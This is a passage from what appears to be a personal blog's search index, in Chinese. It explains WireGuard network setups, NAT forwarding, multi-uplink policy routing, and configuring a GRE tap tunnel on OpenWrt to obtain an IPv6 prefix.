protocol\uff09\u662f\u4e00\u79cd\u6307\u5b9a\u5c01\u5305\u8f6c\u9001\u65b9\u5f0f\u7684\u7f51\u8def\u534f\u5b9a\u3002Internet\u7f51\u7edc\u7684\u4e3b\u8981\u8282\u70b9\u8bbe\u5907\u662f\u8def\u7531\u5668\uff0c\u8def\u7531\u5668\u901a\u8fc7\u8def\u7531\u8868\u6765\u8f6c\u53d1\u63a5\u6536\u5230\u7684\u6570\u636e\u3002\u8f6c\u53d1\u7b56\u7565\u53ef\u4ee5\u662f\u4eba\u5de5\u6307\u5b9a\u7684\uff08\u901a\u8fc7\u9759\u6001\u8def\u7531\u3001\u7b56\u7565\u8def\u7531\u7b49\u65b9\u6cd5\uff09\u3002\u5728\u5177\u6709\u8f83\u5c0f\u89c4\u6a21\u7684\u7f51\u7edc\u4e2d\uff0c\u4eba\u5de5\u6307\u5b9a\u8f6c\u53d1\u7b56\u7565\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\u3002\u4f46\u662f\u5728\u5177\u6709\u8f83\u5927\u89c4\u6a21\u7684\u7f51\u7edc\u4e2d\uff08\u5982\u8de8\u56fd\u4f01\u4e1a\u7f51\u7edc\u3001ISP\u7f51\u7edc\uff09\uff0c\u5982\u679c\u901a\u8fc7\u4eba\u5de5\u6307\u5b9a\u8f6c\u53d1\u7b56\u7565\uff0c\u5c06\u4f1a\u7ed9\u7f51\u7edc\u7ba1\u7406\u5458\u5e26\u6765\u5de8\u5927\u7684\u5de5\u4f5c\u91cf\uff0c\u5e76\u4e14\u5728\u7ba1\u7406\u3001\u7ef4\u62a4\u8def\u7531\u8868\u4e0a\u4e5f\u53d8\u5f97\u5341\u5206\u56f0\u96be\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u52a8\u6001\u8def\u7531\u534f\u8bae\u5e94\u8fd0\u800c\u751f\u3002\u52a8\u6001\u8def\u7531\u534f\u8bae\u53ef\u4ee5\u8ba9\u8def\u7531\u5668\u81ea\u52a8\u5b66\u4e60\u5230\u5176\u4ed6\u8def\u7531\u5668\u7684\u7f51\u7edc\uff0c\u5e76\u4e14\u7f51\u7edc\u62d3\u6251\u53d1\u751f\u6539\u53d8\u540e\u81ea\u52a8\u66f4\u65b0\u8def\u7531\u8868\u3002\u7f51\u7edc\u7ba1\u7406\u5458\u53ea\u9700\u8981\u914d\u7f6e\u52a8\u6001\u8def\u7531\u534f\u8bae\u5373\u53ef\uff0c\u76f8\u6bd4\u4eba\u5de5\u6307\u5b9a\u8f6c\u53d1\u7b56\u7565\uff0c\u5de5\u4f5c\u91cf\u5927\u5927\u51cf\u5c11\u3002</p>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#wg-\u4f7f\u7528\u573a\u666f","title":"wg \u4f7f\u7528\u573a\u666f","text":"<p>\u6309\u7167\u7528\u9014\uff0c\u5217\u4e3e\u51e0\u79cd\u4f7f\u7528\u573a\u666f</p>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u5185\u7f51\u7a7f\u900f","title":"\u5185\u7f51\u7a7f\u900f","text":"<p>\u5373\u9700\u8981\u4ece\u5916\u7f51\u8bbf\u95ee NAT \u540e\u8bbe\u5907\u3002</p> <p>\u53ef\u4ee5\u5728\u8def\u7531\u5668\uff08\u6709\u516c\u7f51\u5730\u5740\uff09\u4e0a\u88c5 wg\uff0c\u8bbe\u7f6e\u5141\u8bb8 wg \u8f6c\u53d1\u5230 wan \u548c lan\u3002\u5176\u5b83\u8bbe\u5907\uff08\u5982\u624b\u673a\uff09\u901a\u8fc7 wg \u8fde\u63a5\u5230\u8def\u7531\u5668\uff0c\u4ece\u800c\u53ef\u4ee5\u8bbf\u95ee\u8def\u7531\u5668\u4e0b\u5c40\u57df\u7f51\u548c\u901a\u8fc7\u8def\u7531\u5668\u4e0a\u7f51\u3002</p>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u7f51\u7edc\u8f6c\u53d1","title":"\u7f51\u7edc\u8f6c\u53d1","text":"","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u4e00\u7ea7\u7f51\u7edc\u8f6c\u53d1","title":"\u4e00\u7ea7\u7f51\u7edc\u8f6c\u53d1","text":"<p>\u4e00\u53f0\u8bbe\u5907\u901a\u8fc7\u53e6\u4e00\u53f0\u8bbe\u5907\u4e0a\u7f51\u3002</p> <p>\u5982\u5b9e\u9a8c\u5ba4 A \u670d\u52a1\u5668\u65e0\u6cd5\u4e0a\u7f51\uff0cB \u670d\u52a1\u5668\u53ef\u4ee5\u4e0a\u7f51\uff08\u6bd4\u5982\u767b\u5f55\u4e86\u7f51\u7edc\u901a\u8d26\u53f7\uff09\uff0cA \u53ef\u4ee5\u8bbf\u95ee B\u3002\u53ef\u4ee5\u901a\u8fc7 wg \u5728 A, B \u95f4\u5efa\u7acb\u96a7\u9053\uff0c\u8bbe\u7f6e A \u7684\u9ed8\u8ba4\u8def\u7531\u5668\u4e3a wg\uff0c\u4ece\u800c\u5c06 A \u7684\u6d41\u91cf\u90fd\u8f6c\u53d1\u7ed9 B\u3002B \u4e0a\u518d\u5f00\u542f ipv4 \u8def\u7531\u8f6c\u53d1\uff0cA \u4fbf\u53ef\u4ee5\u4e0a\u7f51\u3002</p> <p>p.s \u8fd9\u91cc A \u548c B \u867d\u540c\u5c5e\u4e8e\u5b66\u6821\u5185\u7f51\uff0c\u4f46\u4ecd\u7136\u4e0d\u662f\u540c\u4e00\u4e2a\u7f51\u6bb5\u3002\u5982\u679c A \u548c B \u4f4d\u4e8e\u540c\u4e00\u4e2a\u5c40\u57df\u7f51\uff0c\u5219\u4e0d\u9700\u8981\u4f7f\u7528 wg\uff0c\u800c\u662f\u5c06 A \u7684\u7f51\u5173\u8bbe\u7f6e\u4e3a B\uff0c\u7136\u540e\u5728 B \u4e2d\u8bbe\u7f6e\u5c06 A \u7684\u6d41\u91cf NAT \u5373\u53ef\u3002</p> <p>\u5e95\u5c42\u8fc7\u7a0b\u5176\u5b9e\u548c\u4e0a\u9762\u5185\u7f51\u7a7f\u900f\u662f\u4e00\u6837\u7684\uff0c\u4e0d\u8fc7\u6709\u4e2a\u4e0d\u540c\u7684\u5730\u65b9\uff1a</p> <ul> <li>\u539f\u8def\u8fd4\u56de\u95ee\u9898\uff1a\u6211\u4eec (\u5047\u8bbe\u4e3a C) \u4ecd\u9700\u8981\u901a\u8fc7\u4e00\u4e2a ip \u53bb\u76f4\u63a5\u8bbf\u95ee A\uff0c\u8bf7\u6c42 ip \u5305\u4e3a (src=C, dst=A)\u3002\u7167\u7406\u6765\u8bf4\u54cd\u5e94\u5305\u7684\u6e90\u5730\u5740\u5e94\u8be5\u662f A\uff0c\u4f46\u662f\u914d\u7f6e wg \u540e\uff0cA \u7684\u9ed8\u8ba4\u8def\u7531\u662f wg\uff0c\u56e0\u6b64\u6309\u7167\u8def\u7531\u89c4\u5219\uff0c\u54cd\u5e94\u5305\u4f1a\u53d8\u4e3a (src=wg, dst=C)\uff0c\u5e76\u53d1\u9001\u7ed9 B\u3002B \u65e0\u6cd5\u5c06\u79c1\u6709\u5730\u5740\u7684\u5305\u53d1\u9001\u5230\u516c\u7f51\u4e0a\u53bb\uff0c\u56e0\u6b64 C \u65e0\u6cd5\u6536\u5230\u54cd\u5e94\u3002</li> <li>\u89e3\u51b3\u529e\u6cd5\uff1a\u4f7f\u7528\u7b56\u7565\u8def\u7531\uff0c\u5728\u5e94\u7528 wg \u7684 default \u8def\u7531\u524d\uff0c\u63d0\u524d\u5c06\u6e90\u5730\u5740\u4e3a A\u7684\u6309\u7167\u5bf9\u5e94\u63a5\u53e3\u53d1\u9001\u51fa\u53bb</li> </ul>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u4e8c\u7ea7\u7f51\u7edc\u8f6c\u53d1","title":"\u4e8c\u7ea7\u7f51\u7edc\u8f6c\u53d1","text":"<p>\u540c\u4e0a\uff0c\u4f46\u662f B \u670d\u52a1\u5668\u4e5f\u662f\u901a\u8fc7 wg \u8f6c\u53d1\u7ed9\u53e6\u4e00\u53f0\u670d\u52a1\u5668 C \u7684\u3002\u6b64\u65f6\u4f1a\u9047\u5230\u65b0\u7684\u95ee\u9898\uff1a</p> <ul> <li>\u5728\u6309\u7167\u4e0a\u8ff0\u914d\u7f6e\u5b8c A \u540e\uff0c\u4f1a\u53d1\u73b0 A \u4ecd\u7136\u65e0\u6cd5\u4e0a\u7f51\u3002\u8fc7\u7a0b\u5982\u4e0b\uff1a<ul> <li>A \u8bf7\u6c42\u7684\u5305 (src=wgA, dst=B \u7ad9)</li> <li>B \u63a5\u6536\u540e\uff0c\u8f6c\u53d1\u7ed9 C(src=wgA, dst=B \u7ad9)</li> <li>C \u63a5\u6536\u540e\uff0c\u8fdb\u884c SNAT(src=C_WAN, dst=B \u7ad9)\uff0c\u8bb0\u5f55 ip \u7aef\u53e3\u6620\u5c04\u5173\u7cfb</li> <li>B \u7ad9\u54cd\u5e94 (src=B \u7ad9\uff0cdst=C_WAN)</li> <li>C \u63a5\u6536\u540e\uff0c\u8fdb\u884c DNAT(src=B \u7ad9\uff0cdst=wgA)</li> <li>\u6b64\u65f6\u53ef\u4ee5\u53d1\u73b0\uff0cdst=wgA\uff0cC \u662f\u65e0\u6cd5\u8def\u7531\u7ed9 A \u7684</li> </ul> </li> </ul> <p>\u89e3\u51b3\u65b9\u6cd5\uff1a</p> <ul> <li>B \u4e0a\u4e3a wg \u63a5\u53e3\u8bbe\u7f6e NAT\u3002\u8fc7\u7a0b\u5982\u4e0b\uff1a<ul> <li>A \u8bf7\u6c42\u7684\u5305 (src=wgA, dst=B \u7ad9)</li> <li>B \u63a5\u6536\u540e\uff0c\u8fdb\u884c SNAT(src=wgB, dst=B \u7ad9)\uff0c\u8f6c\u53d1\u7ed9 C</li> <li>C \u63a5\u6536\u540e\uff0c\u8fdb\u884c SNAT(src=C_WAN, dst=B \u7ad9)\uff0c\u8bb0\u5f55 ip \u7aef\u53e3\u6620\u5c04\u5173\u7cfb</li> <li>B \u7ad9\u54cd\u5e94 (src=B \u7ad9\uff0cdst=C_WAN)</li> <li>C \u63a5\u6536\u540e\uff0c\u8fdb\u884c DNAT(src=B \u7ad9\uff0cdst=wgB)\uff0c\u8f6c\u53d1\u7ed9 B</li> <li>B \u63a5\u6536\u540e\uff0c\u8fdb\u884c DNAT(src=B \u7ad9\uff0cdst=wgA)\uff0c\u8f6c\u53d1\u7ed9 A</li> <li>A \u63a5\u6536\u5230\u54cd\u5e94</li> </ul> </li> </ul> <p>\u4e0a\u9762\u4e8c\u7ea7\u7f51\u7edc\u8f6c\u53d1\u7684\u89e3\u51b3\u65b9\u6cd5\u662f\uff0c\u4e3a\u4ece wg \u51fa\u53bb\u7684\u6d41\u91cf\u8bbe\u7f6e NAT\u3002</p> <pre><code> iptables -t nat -A POSTROUTING -s 10.0.0.2 -o wg0 -j MASQUERADE\n</code></pre>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u8fde\u63a5\u5b50\u7f51","title":"\u8fde\u63a5\u5b50\u7f51","text":"<p>\u8fde\u63a5\u4e24\u53f0\u8def\u7531\u5668\u5bf9\u5e94\u7684\u5b50\u7f51\uff0c\u8fde\u63a5\u4efb\u4e00\u53f0\u8def\u7531\u5668\u5747\u53ef\u8bbf\u95ee\u4e24\u4e2a\u5b50\u7f51\u7684\u8bbe\u5907\u3002</p> <p>\u5373\u6211\u7684\u7f51\u7edc\u7ed3\u6784</p>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u539f\u8def\u8fd4\u56de\u95ee\u9898\u591a\u7f51\u5173\u8bbe\u7f6e","title":"\u539f\u8def\u8fd4\u56de\u95ee\u9898/\u591a\u7f51\u5173\u8bbe\u7f6e","text":"<p>\u5728\u5ba2\u6237\u7aef\u914d\u7f6e wireguard allowip \u4e3a 0.0.0.0/0 \u540e\uff0c\u4f1a\u51fa\u73b0\u65e0\u6cd5\u8bbf\u95ee\u5ba2\u6237\u7aef\u81ea\u8eab\u7684\u60c5\u51b5\uff08ping, ssh\uff09\u3002</p> <p>\u8fd9\u662f\u56e0\u4e3a\uff1a</p> <p>linux \u9ed8\u8ba4\u6ca1\u6709\u201c\u6d41\u91cf\u539f\u8def\u8fd4\u56de\u201d\u7684\u529f\u80fd</p> <p>\u8003\u8651\u6709\u4e24\u4e2a ISP \u7684\u7f51\u7edc\uff08\u591a\u51fa\u53e3\uff09\uff0c\u5982\u4f55\u505a\u5230\u6570\u636e\u539f\u8def\u8fd4\u56de\u5462</p> <p>\u53c2\u8003\uff1aRouting for multiple uplinks/providers (lartc.org)</p> <p></p> <ol> <li> <p>\u9996\u5148\uff0c\u5728 main \u8def\u7531\u8868\u4e2d\u6dfb\u52a0\u5230\u4e24\u4e2a ISP \u7f51\u6bb5\u7684\u8def\u7531\uff0c\u8fd9\u4fdd\u8bc1\u53ef\u4ee5\u8bbf\u95ee\u5230\u4e24\u4e2a ISP \u7684\u7f51\u5173</p> </li> <li> <p>\u63a5\u7740\uff0c\u6dfb\u52a0\u9ed8\u8ba4\u8def\u7531\u3002</p> <ul> <li>\u53ef\u4ee5\u4e4b\u540e\u518d\u6dfb\u52a0\u7b56\u7565\u8def\u7531\uff0c\u4f7f\u5f97\u67d0\u4e9b ip \u8d70 IPS1\uff0c\u5269\u4f59\u8d70 IPS2</li> </ul> </li> <li> <p>\uff08\u63a5\u4e0b\u6765\u4e24\u6b65\u7528\u4e8e\u4fdd\u8bc1\u6570\u636e\u80fd\u591f\u539f\u8def\u8fd4\u56de\uff0c\u4e0d\u4f1a\u51fa\u73b0\u6765\u81ea IPS1 \u7684\u6d41\u91cf\uff0c\u4ece IPS2 \u51fa\u53bb\uff09</p> </li> <li> <p>\u7136\u540e\uff0c\u521b\u5efa\u4e24\u4e2a\u65b0\u7684\u8def\u7531\u8868 T1 \u548c T2\uff0c\u5404\u81ea\u5c06\u5bf9\u5e94\u7684 ISP \u8bbe\u7f6e\u4e3a\u9ed8\u8ba4\u8def\u7531</p> </li> <li> <p>\u6700\u540e\uff0c\u6dfb\u52a0\u8def\u7531\u7b56\u7565\u3002\u8be5\u89c4\u5219\u6839\u636e\u5305\u7684\u6e90\u5730\u5740\u9009\u62e9\u4f7f\u7528\u5bf9\u5e94 ISP \u7684\u8def\u7531\u8868\uff08T1, T2\uff09\u3002</p> <ul> <li>\u8fd9\u91cc\uff0c\u91cd\u70b9\u5728\u4e8e\u9700\u8981\u539f\u8def\u8fd4\u56de\u7684\u5305\uff0c\u5df2\u7ecf\u83b7\u5f97 src \u5730\u5740\u4e86\uff1f\u4e0d\u9700\u8981\u539f\u8def\u8fd4\u56de\u7684\u5305\uff0c\u5219\u6839\u636e\u4e4b\u524d\u7684\u7b56\u7565\u9009\u62e9 ISP \u51fa\u53e3\u540e\uff0c\u8bbe\u7f6e src \u5730\u5740\u3002</li> </ul> </li> </ol> <pre><code>ip route add 211.200.0.0/30 dev eth1 src 221.200.0.2 table main\nip route add 58.56.0.0/30 dev eth2 src 58.56.0.2 table main\n\nip route add default via 221.200.0.1\n\nip route add 211.200.0.0/30 dev eth1 src 221.200.0.2 table T1\nip route add default via 221.200.0.1 table T1\nip route add 58.56.0.0/30 dev eth2 src 58.56.0.2 table T2\nip route add default via 58.56.0.1 table T2\n\nip rule add from 221.200.0.2 table T1\nip rule add from 58.56.0.2 table T2\n</code></pre>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#wiregaurd--l2-\u96a7\u9053\u7ec4\u7f51","title":"Wiregaurd + L2 \u96a7\u9053\u7ec4\u7f51","text":"","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#l2-\u96a7\u9053\u4f18\u70b9-vs-\u7f3a\u70b9","title":"L2 \u96a7\u9053\u4f18\u70b9 vs \u7f3a\u70b9","text":"<p>I really like wireguard, but one thing that bugs me is the fact that it's layer ... | Hacker News (ycombinator.com)</p> <p>In most scenarios, you want to avoid L2 tunnels to reduce complexity and/or performance issues. The chain of thought typically goes like this:</p> <ul> <li>Remote networks are connected via L2 tunnel.</li> <li>ARP requests are broadcasted over L2 tunnel to all connected networks, introducing scalability issues</li> <li>Proxy ARP is introduced to cache ARP responses</li> <li>Proxy ARP may become out of date or not scale as the L2 domain grows.</li> <li>BGP is introduced to keep track of and broadcast all topology changes</li> <li>How do you mitigate issues caused if Proxy ARP fails?</li> </ul> <p>Most of these issues go away if you use IP tunnels instead of Ethernet because IP was designed to be routable.</p>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u5404\u79cd\u96a7\u9053\u5bf9\u6bd4","title":"\u5404\u79cd\u96a7\u9053\u5bf9\u6bd4","text":"<p>\u5404\u79cd\u96a7\u9053\u5bf9\u6bd4\uff1aAn introduction to Linux virtual interfaces: Tunnels | Red Hat Developer</p> <ul> <li>ipip</li> <li>gre, gretap</li> </ul> <p>GRE tunnels </p> <p>GRETAP </p> <p>\u4e00\u79cd\u534f\u540c\u4f7f\u7528\u591a\u79cd\u96a7\u9053\u4f8b\u5b50</p> <ul> <li>udp2raw\uff1awg \u57fa\u4e8e udp\uff0c\u53ef\u80fd\u88ab\u8fd0\u8425\u5546 qos\u3002\u4f7f\u7528 udp2raw \u5b9e\u73b0 udp in tcp</li> <li>wg\uff1aL3 \u96a7\u9053</li> <li>gre: \u56fe\u4e2d\u7684\u662f tun\uff0c\u4ecd\u662f\u4e09\u5c42\u96a7\u9053 wireguard, wireguard layer 2, wireguard over TCP (github.com)</li> </ul> <pre><code> Host on private LAN                                         Host on the Internet\n +---------------------------------+                       +-------------------------------+\n |   brtun bridge                  |                       |                  brtun bridge |\n | +-------------+                 |                       |                 +--------+    |\n | | ethX gretun |&lt;-&gt;wg0&lt;-&gt;udp2raw | &lt;-Internet, TCP 443-&gt; | udp2raw&lt;-&gt;wg0&lt;-&gt;| gretun |    |\n | +-------------+                 |                       |                 +--------+    |\n +---------------------------------+                       +-------------------------------+\n\n brtun: 192.168.0.200/24                                    brtun: 192.168.0.50/24\n wg0: 12.12.12.2/24                                         wg0: 12.12.12.1/24\n gretun: 12.12.12.2-&gt;12.12.12.1                             gretun: 12.12.12.1-&gt;12.12.12.2\n</code></pre>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#openwrt-gre-\u914d\u7f6e","title":"openwrt gre \u914d\u7f6e","text":"<p>\u53c2\u8003\u8d44\u6599\uff1a</p> <ul> <li>openwrt gre \u914d\u7f6e\uff1a[OpenWrt Wiki] Tunneling interface protocols</li> <li>[OpenWrt Wiki] Routing example: GRE</li> <li>GRE ip \u5305\u4e2d protocol number \u4e3a 47\uff1aList of IP protocol numbers - Wikipedia</li> </ul>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u80cc\u666f\uff1a\u5b66\u6821\u5bbf\u820d\u697c\u6ca1\u6709\u5206\u914d PD\uff0c\u800c\u5b9e\u9a8c\u697c\u5206\u914d\u4e86/64 \u7684 PD\u3002\u56e0\u6b64\u60f3\u901a\u8fc7 L2 \u96a7\u9053\uff0c\u5c06\u5bbf\u820d\u697c\u7684\u63a5\u53e3\u6865\u63a5\u5230\u5b9e\u9a8c\u697c\u8def\u7531\u5668\u7684 wan \u53e3\u4e0a\uff0c\u4ece\u800c\u83b7\u5f97\u4e00\u4e2a PD \u5730\u5740\u3002\u4e4b\u540e\u5229\u7528\u8be5 PD \u5728 lan \u4e0a\u5f00\u542f ipv6 ra server\uff0c\u7ed9 lan \u5206\u914d ipv6 \u5730\u5740\u3002</p> <p>\u601d\u8def\uff1a\u4e24\u53f0\u8def\u7531\u5668 op1, op2 \u901a\u8fc7 wg \u8fde\u63a5\uff0c\u57fa\u4e8e wg \u63a5\u53e3 ip \u5efa\u7acb gretap \u96a7\u9053\u3002op1 \u5c06\u8be5 tap \u6865\u63a5\u5230 br-wan \u4e0a\u3002op2 \u5728\u8be5 tap \u4e0a\u5f00\u542f dhcpv6 client\uff0c\u7533\u8bf7\u4e00\u4e2a PD\u3002</p>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<p>\u786e\u4fdd\u5b89\u88c5\u4e86\u4ee5\u4e0b\u4f9d\u8d56</p> <pre><code>root@op1 \u279c  ~ opkg list-installed |grep gre\ngre - 13\nkmod-gre - 5.10.146-1\nkmod-gre6 - 5.10.146-1\nluci-proto-gre - git-21.158.43143-b4c394f\n</code></pre> <p>\u786e\u4fdd\u4ee5\u4e0b\u5185\u6838\u6a21\u5757\u5df2\u52a0\u8f7d</p> <pre><code>root@op1 \u279c  ~ lsmod |grep gre\ngre                    16384  1 ip_gre\nip_gre                 36864  0\nip_tunnel              32768  1 ip_gre\n</code></pre> <p>\u5982\u679c\u662f pve \u7684\u8bdd\uff0c\u901a\u5e38\u6ca1\u6709\u52a0\u8f7d\u3002\u9700\u8981\u624b\u52a8 modprobe\uff0c\u5e76\u6dfb\u52a0\u5230<code>/etc/module</code>\u4e2d</p> <pre><code>modprobe ip_gre\n</code></pre> <pre><code>gre\nip_gre\nip_tunnel\nip6_gre\nip6_tunnel\n</code></pre> <p>\u5b89\u88c5\u4e86 gre \u540e\uff0cluci \u4e2d\u521b\u5efa\u63a5\u53e3\u65f6\u53ef\u80fd\u8fd8\u662f\u65e0\u6cd5\u9009\u62e9 gre\uff0c\u6b64\u65f6\u9700\u8981\u91cd\u542f network: <code>/etc/init.d/network restart</code></p>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u914d\u7f6e","title":"\u914d\u7f6e","text":"","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#op1-\u548c-op2-\u4e0a\u90fd\u521b\u5efa-gre1-\u63a5\u53e3","title":"op1 \u548c op2 \u4e0a\u90fd\u521b\u5efa gre1 \u63a5\u53e3","text":"<ul> <li>protocal \u9009\u62e9 gretap over ipv4</li> <li>local \u548c remote \u5730\u5740\u586b wg \u63a5\u53e3\u5730\u5740</li> <li>\u521b\u5efa\u6210\u529f\u540e\uff0cip a \u53ef\u4ee5\u770b\u5230\u591a\u51fa\u4e00\u4e2a gre4t-gre1 \u7684\u63a5\u53e3 </li> </ul> <p>\u5982\u679c\u4f7f\u7528 wan \u53e3 ipv6 \u521b\u5efa gre tap\uff0c\u4e24\u7aef\u90fd\u9700\u8981\u6dfb\u52a0 allow gre input \u7684\u9632\u706b\u5899\u89c4\u5219\u3002\u9ed8\u8ba4\u662f\u6ca1\u6709 gre \u7c7b\u578b\u7684\uff0c\u5728 custom \u4e2d\u8f93\u5165 47 \u6216\u5219 gre \u56de\u8f66\u4fbf\u4f1a\u51fa\u73b0\u8be5\u7c7b\u578b\u3002 </p>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#op1-\u5c06-gre-device-\u6dfb\u52a0\u5230-bridge","title":"op1 \u5c06 gre device \u6dfb\u52a0\u5230 bridge","text":"<ul> <li>\u540d\u5b57\u586b@gre1\uff08\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5199 gre4t-gre1\uff09 </li> </ul>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#op1-\u8bbe\u7f6e\u9632\u706b\u5899-wan-forward","title":"op1 \u8bbe\u7f6e\u9632\u706b\u5899 wan forward","text":"<ul> <li>\u5c06 gre1 \u8bbe\u7f6e\u4e3a wan</li> <li>\u9632\u706b\u5899\u4e2d\uff0c\u8bbe\u7f6ewan zone forward \u4e3a accept\uff08\u9ed8\u8ba4\u4e3a reject\uff09\u3002\u5426\u5219 gre1 \u8bbe\u5907\u4e0a\u6765\u5305\u65e0\u6cd5\u4ece wan \u8f6c\u53d1\u51fa\u53bb\uff0c\u4ece\u800c\u65e0\u6cd5\u8bbf\u95ee\u4e92\u8054\u7f51\u3002 </li> </ul>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#op2-\u8bbe\u7f6e-dhcpv6","title":"op2 \u8bbe\u7f6e dhcpv6","text":"<p>\u5728 gre1 tap \u4e0a\u542f\u7528 dhcpv6 client\uff0copenwrt \u4e0a\u8be5\u64cd\u4f5c\u4e3a\u521b\u5efa\u4e00\u4e2a interface\uff0c\u534f\u8bae\u9009\u62e9 dhcpv6 client</p> <ul> <li>\u8be5\u63a5\u53e3\u9ad8\u7ea7\u8bbe\u7f6e\u4e2d\u53ef\u4ee5\u52fe\u9009 source route\uff0c\u8fd9\u6837\u5bf9\u4e8e\u6709\u591a\u4e2a uplink\uff0c\u5c31\u80fd\u81ea\u52a8\u5904\u7406\u8def\u7531<ul> <li>\u6e90\u5730\u5740\u4e3a\u8be5 pd \u7684\u5730\u5740\uff0c\u8d70 tap \u63a5\u53e3</li> <li>\u6e90\u5730\u5740\u4e3a wan \u53e3 slaac \u7684\u5730\u5740\uff0c\u8d70\u539f\u6765\u7684 wan \u53e3 </li> </ul> </li> </ul>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#ubuntu-gre-\u914d\u7f6e","title":"ubuntu gre \u914d\u7f6e","text":"<ul> <li>\u5148\u4f7f\u7528 wg0\uff0c\u5efa\u7acb wiregaurd \u8fde\u63a5</li> <li>\u518d\u4f7f\u7528 gretap \u5efa\u7acb\u4e8c\u5c42\u96a7\u9053<ul> <li>\u63a5\u7740 op \u7aef\u5728 gretap device \u4e0a\u521b\u5efa dhcp6 \u7684 client\uff08\u7531\u4e8e\u53ea\u9700\u8981 ipv6 